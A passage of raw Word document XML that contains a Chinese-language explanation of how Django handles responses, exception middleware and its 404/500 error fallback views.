      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>作</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为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> response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Content-Type header </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的值（它应该是第二位置参数，</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或者是关键字参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> mine_type</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）。如果没有提供这个参数，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>将会使</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用配置中</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> DEFAULT_MIME_TYPE </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的值和</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> DEFAULT_CHARSET </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的值，如果你没有</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在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的全局配置文件中更改它们的话，分别是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> “text/html”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“utf-8”</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E1C4CA"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69" w:name="sec16"/>
      <w:bookmarkEnd w:id="69"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，第三回合：异常</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65476773"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lastRenderedPageBreak/>
        <w:t>如果</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函数，或者其中的什么东西，发生了异常，那么</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> get_response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>（我知</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道我们已经花了些时间深入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> views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templates</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，但是一旦</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返回或产生异常，我们仍将重拾处理器中间的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> get_response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法）将遍历它的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:bookmarkStart w:id="70" w:name="OLE_LINK2"/>
      <w:bookmarkStart w:id="71" w:name="OLE_LINK1"/>
      <w:bookmarkEnd w:id="70"/>
      <w:bookmarkEnd w:id="71"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">_exception_middleware </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>实例变量并调用那里的每个方法，传入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpResponse </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和这个</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作为参数。如果顺利，这些方法中的一个会实例化一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpResponse </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>并返回它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F58A088"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72" w:name="sec17"/>
      <w:bookmarkEnd w:id="72"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>仍然没有响应？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061387F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这时候有可能还是没有得到一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpResponse</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，这可能有几个原因：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3654645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view </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>可能没有返回值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9AA51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view </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>可能产生了异常但没有一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> middleware </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>能处理它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DBB44E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3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> middleware </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法试图处理一个异常时自己又产生了一个新的异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444E656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这时候，</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会回到自己的异常处理机制中，它们有几个层次：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E95B97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w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>如果</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Http404 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>并且</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设置为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> True</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将</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执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> view django.views.debug.technical_404_response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，传入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequest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作为参数。这个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会展示</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL resolver </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>试图匹配的模式信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F93D9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w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>如果</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False </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>并且异常是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Http404</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会调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL resolver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resolve_404 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法。这个方法查看</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>配置以判断哪一个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被指定用来处理</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> 404 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>错误。默认是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.views.defaults.page_not_found</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，但可以在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>配置中给</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> handler404 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>变量赋值来更改。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14BD5DA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3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对于任何其它类型的异常，如果</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设置为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> True</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将执</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行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> view django.views.debug.technical_500_response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，传入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequest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作为参数。这个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提供了关于异常的详细</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信息，包括</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> traceback</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，每一个层次</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中的本地变量，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">HttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象的详细描述和所有无效配置的列表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBF345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4. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>如果</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False</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会调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL resolver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resolve_500 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法，它和</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> resolve_404 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法非常相似，这时默认的</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django.views.defaults.server_error</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，但可以在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
